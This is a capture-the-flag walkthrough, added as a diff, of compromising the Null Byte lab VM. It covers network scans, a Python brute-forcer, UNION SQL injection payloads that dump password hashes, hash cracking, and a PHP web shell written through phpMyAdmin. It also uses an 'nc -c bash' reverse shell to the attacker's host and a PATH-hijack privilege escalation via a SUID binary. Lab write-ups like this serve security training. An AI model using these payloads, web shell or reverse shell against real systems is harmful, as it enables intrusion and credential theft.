@@ -1,0 +1,441 @@
+$ sudo netdiscover -i wlp2s0
+
+192.168.1.142
+
+
+$ nmap -sV 192.168.1.142 -p- -Pn -T5
+
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+50408/tcp open  status  1 (RPC #100024)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+$ nmap -A 192.168.1.142 -Pn -T5 -p-
+
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Null Byte 00 - level 1
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          46086/tcp6  status
+|   100024  1          49451/udp   status
+|   100024  1          50408/tcp   status
+|_  100024  1          50922/udp6  status
+777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
+|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
+|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
+|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)
+50408/tcp open  status  1 (RPC #100024)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+---- Scanning URL: http://192.168.1.142/ ----
++ http://192.168.1.142/index.html (CODE:200|SIZE:196)                                                                                                        
+==> DIRECTORY: http://192.168.1.142/javascript/                                                                                                              
+==> DIRECTORY: http://192.168.1.142/phpmyadmin/                                                                                                              
++ http://192.168.1.142/server-status (CODE:403|SIZE:301)                                                                                                     
+==> DIRECTORY: http://192.168.1.142/uploads/                                                                                                                 
+                                           
+
+lets go to the web page
+
+http://192.168.1.142
+
+there is an image , download it
+
+$ exiftool main.gif
+
+File Permissions                : rw-r--r--
+File Type                       : GIF
+File Type Extension             : gif
+MIME Type                       : image/gif
+GIF Version                     : 89a
+Image Width                     : 235
+Image Height                    : 302
+Has Color Map                   : No
+Color Resolution Depth          : 8
+Bits Per Pixel                  : 1
+Background Color                : 0
+Comment                         : P-): kzMb5nVYJw
+Image Size                      : 235x302
+Megapixels                      : 0.071
+
+
+I thought that maybe the commend field is a directory
+
+
+go to the directory
+http://192.168.1.142/kzMb5nVYJw
+
+
+yes it is a directory
+
+there is a form that we submit a key, lets look at the source code
+<center><font color='red'>invalid key</font></center><br>
+<center>
+<form method="post" action="index.php">
+Key:<br>
+<input type="password" name="key">
+</form> 
+</center>
+<!-- this form isn't connected to mysql, password ain't that complex --!>
+
+
+I wrote a python script to brute-force the form and password is elite
+
+
+#!/usr/bin/python
+import requests
+
+#top-passwords-shortlist.txt
+#10-million-password-list-top-1000.txt
+#<center><font color='red'>invalid key</font></center><br>
+
+with open('/home/cihan/Desktop/Me/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt') as file:
+    lines = file.readlines()
+
+
+
+value = ""
+for i in range(len(lines)):
+    lines[i] = lines[i].strip()
+
+
+for i in lines:
+    r = requests.post("http://192.168.1.11/kzMb5nVYJw/index.php", data={'key':i})
+    try:
+        if r.text.split("'red'>")[1].split('</font>')[0] != 'invalid key':
+            print("key =  " + i)
+    except:
+        print("error occured" + i
+	
+	
+when I typed key elite
+
+now there is another form that says it searchs for usernames
+
+type something, and it says fetched data succesfully
+
+this might talks to the database, lets see if we can do an sqlinjection
+
+type a double quote "
+
+Could not get data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%"' at line 1
+
+yes it is vulnerable to sql injection
+
+now type " or 1=1--+
+
+EMP ID :1
+EMP NAME : ramses
+EMP POSITION :
+--------------------------------
+EMP ID :2
+EMP NAME : isis
+EMP POSITION : employee
+--------------------------------
+Fetched data successfully 
+
+because this form uses GET we can do thiese from url itself , too
+
+lets see how many columns the actual query does return
+
+payload = " union select null,null,null --+
+
+it returns 3 columns
+
+payload = " union select null,null,user() --+
+
+EMP ID :1
+EMP NAME : ramses
+EMP POSITION :
+--------------------------------
+EMP ID :2
+EMP NAME : isis
+EMP POSITION : employee
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : root@localhost
+--------------------------------
+Fetched data successfully
+
+paylaod = " union select null,null,database() --+
+
+EMP ID :1
+EMP NAME : ramses
+EMP POSITION :
+--------------------------------
+EMP ID :2
+EMP NAME : isis
+EMP POSITION : employee
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : seth
+--------------------------------
+Fetched data successfully 
+
+the database is seth
+
+
+payload = " union select null,null,table_name from information_schema.tables where table_schema = 'seth' --+
+
+this paylaod will find the tables in database
+
+EMP ID :1
+EMP NAME : ramses
+EMP POSITION :
+--------------------------------
+EMP ID :2
+EMP NAME : isis
+EMP POSITION : employee
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : users
+--------------------------------
+Fetched data successfully 
+
+
+there is a users table in seth database
+
+lets see the columns
+
+payload = " union select null,null,column_name from information_schema.columns where table_name='users' --+
+
+EMP ID :1
+EMP NAME : ramses
+EMP POSITION :
+--------------------------------
+EMP ID :2
+EMP NAME : isis
+EMP POSITION : employee
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : id
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : user
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : pass
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : position
+--------------------------------
+Fetched data successfully 
+
+lets see what the table users has
+
+paylaod = " union select null,null,concat(id, 0x3a, user, 0x3a, pass, 0x3a, position) from users --+
+
+
+EMP ID :1
+EMP NAME : ramses
+EMP POSITION :
+--------------------------------
+EMP ID :2
+EMP NAME : isis
+EMP POSITION : employee
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : 1:ramses:YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE:
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : 2:isis:--not allowed--:employee
+--------------------------------
+Fetched data successfully 
+
+
+
+
+
+
+When I was investigating further I found a table in mysql database named user
+
+
+here its content
+
+EMP ID :1
+EMP NAME : ramses
+EMP POSITION :
+--------------------------------
+EMP ID :2
+EMP NAME : isis
+EMP POSITION : employee
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : localhost:root:*18DC78FB0C441444482C7D1132C7A23D705DAFA7
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : nullbyte:root:*18DC78FB0C441444482C7D1132C7A23D705DAFA7
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : 127.0.0.1:root:*18DC78FB0C441444482C7D1132C7A23D705DAFA7
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : ::1:root:*18DC78FB0C441444482C7D1132C7A23D705DAFA7
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : localhost:debian-sys-maint:*BD9EDF51931EC5408154EBBB88AA01DA22B8A8DC
+--------------------------------
+EMP ID :
+EMP NAME :
+EMP POSITION : localhost:phpmyadmin:*18DC78FB0C441444482C7D1132C7A23D705DAFA7
+--------------------------------
+Fetched data successfully 
+
+
+
+root password look like a mysql hash
+
+lets crack it with hashcat
+
+$hashcat -m 300 -a 0 hash.database /home/cihan/Desktop/Me/SecLists/kaonashi14M.txt
+
+18dc78fb0c441444482c7d1132c7a23d705dafa7:sunnyvale
+
+we found the password of root account in database and also password of phpmyadmin
+
+
+Now I will try to use phpmyadmin to upload a shell file on the server and 
+try to get a reverse shell
+
+because we now there is an upload directory in the server I will upload the 
+shell in that directory
+
+now go to http://192.168.1.142/phpmyadmin
+
+and login as root using the credentials we have found before
+
+and 
+run this query in the sql 
+
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/uploads/shell.php" 
+
+
+now set up a listener on the local  host
+
+$nc -lnvp 4444
+
+then go to http://192.168.1.142/uploads/shell.php1?cmd=nc -c bash 192.168.1.67
+
+and now we got the shell
+
+
+I dig really deep but I dint find anything from here 
+lets go back to user ramses
+
+ 1:ramses:YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE:
+ 
+his password lookl like base64 for jus = is missing 
+lets use base64 decoder
+
+decode version is c6d6bd7ebf806f43c76acc3681703b81
+
+this one looks like md5 five 
+decode it online 
+yes password is omega
+
+lets try ssh into ramses account
+
+$ ssh -l ramses 192.168.1.142 -p 777
+
+yes we are in
+
+$ls -la
+
+-rw------- 1 ramses ramses   96 Aug  2  2015 .bash_history
+-rw-r--r-- 1 ramses ramses  220 Aug  2  2015 .bash_logout
+-rw-r--r-- 1 ramses ramses 3515 Aug  2  2015 .bashrc
+-rw-r--r-- 1 ramses ramses  675 Aug  2  2015 .profile
+
+$cat .bash_history
+
+
+sudo -s
+su eric
+exit
+ls
+clear
+cd /var/www
+cd backup/
+ls
+./procwatch 
+clear
+sudo -s
+cd /
+ls
+exit
+
+
+lets go to /var/www/backup directory
+
+$ cd /var/www/backup
+$ls -la
+
+-rwsr-xr-x 1 root root 4932 Aug  2  2015 procwatch
+-rw-r--r-- 1 root root   28 Aug  2  2015 readme.txt
+
+as you see the suid bit is set
+
+lets execute the command to see what it does
+$./procwatch
+
+ 5728 pts/3    00:00:00 procwatch
+ 5729 pts/3    00:00:00 sh
+ 5730 pts/3    00:00:00 ps
+
+
+this is output of ps command
+
+procwatch calls ps command
+
+
+
+now we can link a command with ps and when we call procwatch it will call ps 
+so will do ps, 
+
+$ln -s /bin/sh ps
+
+# now export our path
+$export PATH=`pwd`:${PATH}
+
+$./procwatch
+# whoami 
+root
+# cat /root/proof.txt
+
+adf11c7a9e6523e630aaf3b9b7acb51d
+
+It seems that you have pwned the box, congrats. 
+Now you done that I wanna talk with you. Write a walk & mail at
+xly0n@sigaint.org attach the walk and proof.txt
+If sigaint.org is down you may mail at nbsly0n@gmail.com
+
+
